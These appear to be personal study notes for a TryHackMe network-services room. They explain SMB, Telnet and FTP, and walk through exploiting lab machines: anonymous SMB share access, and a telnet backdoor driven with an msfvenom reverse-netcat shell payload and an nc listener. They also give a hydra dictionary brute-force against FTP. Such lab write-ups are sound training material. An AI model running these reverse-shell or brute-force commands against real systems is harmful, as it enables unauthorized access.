This room will explore common Network Service vulnerabilities and misconfigurations.

for wifi hacking --> https://tryhackme.com/room/wifihacking101

this room is for how to gain unauthorized access to a machine by exploiting network services.

  --> Understanding SMB
SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.
https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 
""""  NOTE :- these are older version of smb  """"

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.

What runs SMB?
Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

  -->  Enumeration SMB
Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.
This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.

Port Scanning
The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.

Enum4Linux
Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's already installed on the AttackBox, however if you need to install it on your own attacking machine, you can do so from the official github.
https://github.com/portcullislabs/enum4linux

Enum4Linux serves several purposes:
-->  Enumerating Shares: It lists all the shared resources (like files and directories) that are available on the SMB server.
-->  Gathering User Information: It retrieves information about users, groups, and their permissions on the target system.
-->  Identifying System Details: It can reveal details about the operating system and configuration of the SMB server.

The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"

TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list
-a             all of the above (full basic enumeration)

  -->  Exploiting SMB
Types of SMB Exploit
While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

Method Breakdown

So, from our enumeration stage, we know:
    - The SMB share location
    - The name of an interesting SMB share

SMBClient
Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite.
https://www.samba.org/samba/docs/current/man-html/smbclient.1.html --> to install smb client

smbclient //[IP]/[SHARE] --> syntax
Followed by the tags:

-U [name] : to specify the user
-p [port] : to specify the port

solving the room
step one is nmap
  --> found 3 services running 22,139,445 out of which 139 and 445 are smb related

using enum4linux -a IP
we got information about various things like 
--> OS version
--> shares info (sharename)
--> domain/ workgroup name
--> machine name - POLOSMB

using smbclient
--> we look out for commands we can use like more(to cat details and use q to quit) 
--> more , get , cd (use "" for every file/direcotry name) eg cd ".ssh" or more "information.txt"

read the working information note found about the user john cactus has ssh permission now go to .ssh directory and found
id_rsa , id_rsa.pub cat these file using more you will found 

username cactus@ip 
password use ssh -i id_rsa cactus@IP_ADDRESS you will connect with the username 
then go for cat smb.txt you got the flag

  --> Understanding Telnet
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Replacement
Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"


  -->  Enumerating Telnet
after performing nmap command for enumaration
1.)  we got 0 ports open at first 
2.)  with -p- we got 1 port open 8012
3.)  with -A command we find out about its a backdoor of username skidy
4.)  its using non-standard port --> indicating malicious intent

  -->  Exploiting Telnet
Types of Telnet Exploit
Telnet, being a protocol, is in and of itself insecure as It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.
There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
  ""  https://www.cvedetails.com/  ""
  ""  https://cve.mitre.org/  ""

Method Breakdown

So, from our enumeration stage, we know:
    - There is a poorly hidden telnet service running on this machine
    - The service itself is marked "backdoor"
    - We have possible username of "Skidy" implicated
Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

What is a Reverse Shell?

A "shell" can simply be described as a piece of code or program which can be used to gain code or command execution on a device.
A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

connecting with the machine with telnet
telnet ip port
we got connection with SKIDDY'S BACKDOOR

we cant run any commands like that for that we need to use .RUN command here to run 
for testing we use .RUN ping local ip -c 1 (only 1 packet count) and at host we use sudo tcpdump ip proto \\icmp -i eth0 (interface here)

we got the ping packet great now lets go to another step to run the reverse shell payload

for generating it use msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R --> change accordingly

let break down this msfvenom command

msfvenom --> A tool within the Metasploit Framework used for generating and encoding payloads.

-p -->  This option specifies the payload type you want to create.

cmd --> This indicates that the payload is a command-based payload. These types of payloads are designed to execute commands directly on the target system. They don’t involve complex interactions or use high-level scripting languages but instead execute simple commands.

unix --> This specifies the target operating system. In this case, unix indicates that the payload is intended for Unix-like operating systems, which includes Linux, macOS, and other Unix variants.

reverse_netcat --> This is the specific type of payload. It denotes a reverse shell payload that uses netcat to establish a connection back to the attacker’s machine. netcat

-lhost= and -lport= --> define the attacker local ip address and port to listen to

-R --> This flag stands for "Raw" output format. It indicates that the payload should be generated in raw format, which is suitable for direct use in scripts or direct execution.

after executing the payload which starts from "mkfifo" using .RUN payload we got shell conncetion for that use nc -lvp 4444 
telnet room ends at cat flag.txt

  --> Understanding FTP
File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way. (client-server communication model)

A typical FTP session operates using two channels: 2 channels
-->  a command (sometimes called the control) channel
-->  a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.
While the session is open, the client may execute FTP commands on the server.

Active vs Passive
The FTP server may support either Active or Passive connections, or both. 
-->  In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
-->  In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

 https://www.ietf.org/rfc/rfc959.txt. The IETF is one of a number of standards agencies, who define and regulate internet standards. --> read this for more ftp knowledge
FTP use port 21 by default

  -->  Enumerating FTP
-->  Method
We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

-->  Resources
As we're going to be logging in to an FTP server, we will need to make sure an FTP client is installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing "ftp" into the console. If you're brought to a prompt that says: "ftp>", then you have a working FTP client on your system. If not, it's a simple matter of using "sudo apt install ftp" to install one.

-->  Alternative Enumeration Methods
It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP. (means we can use cwd while trying to connect to ftp server and it will response with some differnetly way which will tell us about the users and give extra information)

"""""""""""" This vulnerability is documented at: https://www.exploit-db.com/exploits/20745 """"""""""""

after running nmap scan i found 1 port open but tryhackme accepting 2 ports are open

we get detail information about ftp server running version info and varient 
port 21

after connecting to ftp ipaddress use username anonymous password blank
we got access and there was a file which tells us about the username mike (get filename to download the file locally)

  -->  Exploiting FTP
-->  Types of FTP Exploit
Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape(https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP) demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

-->  Method Breakdown
So, from our enumeration stage, we know:
    - There is an FTP server running on this machine
    - We have a possible username
Using this information, let's try and bruteforce the password of the FTP Server.

Hydra
Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.
(for downloading hydra --> https://github.com/vanhauser-thc/thc-hydra)

The syntax for the command we're going to use to find the passwords is this:
"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"

SECTION             FUNCTION

hydra                   Runs the hydra tool

-t 4                    Number of parallel connections per target

-l [user]               Points to the user who's account you're trying to compromise

-P [path to dictionary] Points to the file containing the list of possible passwords

-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP]            The IP address of the target machine

ftp / protocol          Sets the protocol


for further learning 

-->  https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
-->  https://attack.mitre.org/techniques/T1210/
-->  https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
